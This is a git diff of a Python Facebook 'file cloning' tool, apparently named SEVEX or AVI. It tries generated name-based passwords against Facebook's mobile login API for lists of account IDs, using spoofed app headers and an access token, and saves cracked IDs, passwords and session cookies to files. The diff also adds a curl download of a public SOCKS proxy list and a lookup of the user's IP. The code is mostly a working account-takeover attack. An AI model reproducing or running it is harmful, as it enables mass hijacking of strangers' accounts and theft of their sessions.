@@ -137,6 +137,24 @@ def F2():
 	ua = s + e + b + f + g + h + k + l
 	return ua
 	
+#_________PROXY________#
+try:
+    os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt')
+except:
+    pass
+sock=open('socks4.txt','r').read().splitlines()
+
+#_________[ TRACKING USERS IP ]______>>
+ip = requests.get("https://api.ipify.org").text
+
+#__________FOLDER MAKE_________#
+
+try:
+    os.mkdir('FAHAD')
+    os.system('mv FAHAD /sdcard')
+except:
+    pass
+   
 #__________ua___________# 
 class jalan:
     def __init__(self, z):
@@ -151,8 +169,7 @@ def clear():
 	print(logo)
 logo =(""" \x1b[38;5;8m
 
-
-░██████╗███████╗██╗░░░██╗███████╗██╗░░██╗
+ ░██████╗███████╗██╗░░░██╗███████╗██╗░░██╗
 ██╔════╝██╔════╝██║░░░██║██╔════╝╚██╗██╔╝
 ╚█████╗░█████╗░░╚██╗░██╔╝█████╗░░░╚███╔╝░
 ░╚═══██╗██╔══╝░░░╚████╔╝░██╔══╝░░░██╔██╗░
@@ -160,8 +177,8 @@ logo =(""" \x1b[38;5;8m
 ╚═════╝░╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
                     
    
-    [\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL NAME          \x1b[38;5;8m:   \033[1;37mSEVEN TOOL
-    \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL OWNER         \x1b[38;5;8m:   \033[1;37mSEVEN ACHARII
+    [\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL NAME          \x1b[38;5;8m:   \033[1;37mSEVEX TOOL
+    \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL OWNER         \x1b[38;5;8m:   \033[1;37mSEVEN ACHARII 
     \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL TYPE          \x1b[38;5;8m:   \033[1;37mFILE CLONING
     \x1b[38;5;8m[\033[1;32m×\x1b[38;5;8m] \033[1;37mTOOL VERSION      \x1b[38;5;8m :   \033[1;36m0.1 
 \033[1;37m====================================================""")
@@ -174,7 +191,7 @@ oks=[]
 cps=[]
 pcp=[]
 ck=[]
-
+   
 #_________[ IMPORTING TIME MODULS ]______>>
 from bs4 import BeautifulSoup
 from datetime import date
@@ -202,7 +219,7 @@ else:
     tag = "AM"
     
 #_________MAIN MENU_________#
-def AVI():
+def SEVEX():
     try:
                 clear()        
                 x = ("***")
@@ -215,7 +232,7 @@ def AVI():
                         line()
                         xd=input('\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCHOOSE \x1b[38;5;8m: \033[1;37m')
                         
-                        if xd in ['A','0A']:
+                        if xd in ['A','0']:
                                 clear()
                                 
                                 print('\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mPUT FILE EXAMPLE \x1b[38;5;8m:  \033[1;37m/sdcard/AVI.txt ')
@@ -226,7 +243,7 @@ def AVI():
                                 except FileNotFoundError:
                                         print('\033[0;97m[•]\x1b[1;91m FILE LOCATION NOT FOUND')
                                         time.sleep(1)
-                                        SEVEN()
+                                        SEVEX()
                                 clear()
                                 print("\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCHOOSE METHOD 4")
                                 line()
@@ -308,7 +325,7 @@ def AVI():
                                 os.system('python sevex.py')
                         elif xd in ['0','00']:
                                 clear()
-                                print('  ⪼THANK YOU FOR USING SEVEX TOOL !!! ')
+                                print('  ⪼THANK YOU FOR USING AVI TOOL !!! ')
                                 exit()
                         
                         
@@ -328,7 +345,8 @@ def api1(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			head = {'User-Agent':F1(),'Accept-Encoding':'gzip,'deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 35068553172862f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'d4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','437a4a32','access_token':' 35068553172862f8ce9f74b12f84c123cc23437a4a32'}
+			head = {'User-Agent':F1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
@@ -402,10 +420,10 @@ def newidx(ids,names,passlist):
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 				cookies = f"sb={ssbb};{ckkk}"
-				print('\r\r\n\n\033[1;32m ╭─\033[38;5;8m[\033[1;32mALIVE:\033[38;5;8m] \033[1;33m'+uid+' | '+pas+'\033[38;5;8m')
-				print('\r\r\033[1;32m ╰─\033[38;5;8m[\033[1;32mSINCE:\033[38;5;8m] \033[1;33m'+asha(uid)+'\033[38;5;8m')
-				print('\r\r\033[1;32m ╭─\033[38;5;8m[\033[1;32mFB LINK:\033[38;5;8m] \033[1;33mhttps://www.facebook.com/'+uid+'\033[38;5;8m')
-				print('\r\r\033[1;32m ╰─\033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
+				print('\r\r\n\n\033[1;32m - \033[38;5;8m[\033[1;32mALIVE:\033[38;5;8m] \033[1;33m'+uid+' - '+pas+'\033[38;5;8m')
+				print('\r\r\033[1;32m - \033[38;5;8m[\033[1;32mSINCE:\033[38;5;8m] \033[1;33m'+asha(uid)+'\033[38;5;8m')
+				print('\r\r\033[1;32m - \033[38;5;8m[\033[1;32mFB LINK:\033[38;5;8m] \033[1;33mhttps://www.facebook.com/'+uid+'\033[38;5;8m')
+				print('\r\r\033[1;32m - \033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
 				#cek_apk(session,coki)
 				open('/sdcard/SEVEXm4-OK.txt','a').write(uid+' | '+pas+'\n')
 				open('/sdcard/SEVEXm4-COOKIES.txt','a').write(uid+' | '+pas+' ==>> '+cookies+'\n')
